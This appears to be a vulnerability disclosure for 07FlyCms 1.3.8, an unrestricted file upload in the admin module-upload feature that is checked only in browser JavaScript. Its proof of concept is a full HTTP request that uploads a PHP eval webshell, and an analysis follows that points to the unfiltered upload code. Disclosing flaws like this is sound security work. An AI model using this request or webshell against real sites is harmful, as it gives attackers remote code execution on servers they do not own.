# Vendor

零起飞

# Product

07FlyCms

# version

1.3.8

# Download 

https://gitee.com/07fly/cms-php.git

# Vulnerability

FileUpload

# Description

In the background of 07flycms, you can customize the upload module plug-in. There are file restrictions in the front-end js, but the uploaded files and file contents are not filtered on the server. As a result, attackers can directly upload webshell files after disabling the front-end js in the browser.

# POC
```
POST /admin/SysModule/upload/ajaxmodel/upload/uploadfilepath/sysmodule_1 HTTP/1.1
Host: 192.168.17.22
Content-Length: 205
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKP43F8RlsGW8OZGd
X-Requested-With: XMLHttpRequest
Accept: */*
Origin: http://192.168.17.22
Referer: http://192.168.17.22/admin/SysModule/upload
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: nSLI_2132_logintime=1722342602; csrf_8898a5=f6e4cbf6; Hm_lvt_afc2b8bbe5afca7b1c77c05445eadd98=1728259730; HMACCOUNT=4D4FE04291E73193; Hm_lpvt_afc2b8bbe5afca7b1c77c05445eadd98=1728259737; PHPSESSID=1q6iuem96njfmofjnb4j5bo41t; Hm_lvt_580632b24aea12910a1609b81ffaf23d=1728259949; Hm_lpvt_580632b24aea12910a1609b81ffaf23d=1728260578
Connection: close

------WebKitFormBoundaryKP43F8RlsGW8OZGd
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: text/php

<?php eval($_POST[1]);?>
------WebKitFormBoundaryKP43F8RlsGW8OZGd--
```

# Analysis

1. In the app/admin/controller/SysModule.php page, when the value passed in ajaxmodel is upload, the uploadFile function is triggered.
<img width="922" alt="image" src="https://github.com/user-attachments/assets/23759d11-6941-4229-89e4-bd76d6c6ce81">

2. In the app/common/logic/Upload.php page, there is no filtering in the uploadFile function.
<img width="954" alt="image" src="https://github.com/user-attachments/assets/ae9ebcb9-ef82-4e75-aabf-ddcfa69337c5">
<img width="1018" alt="image" src="https://github.com/user-attachments/assets/c95742e0-55a6-4fdd-a037-2acd84e31306">

3. Access webshell
<img width="715" alt="image" src="https://github.com/user-attachments/assets/691da6a9-42c1-49f7-9445-7c39b172ce6c">
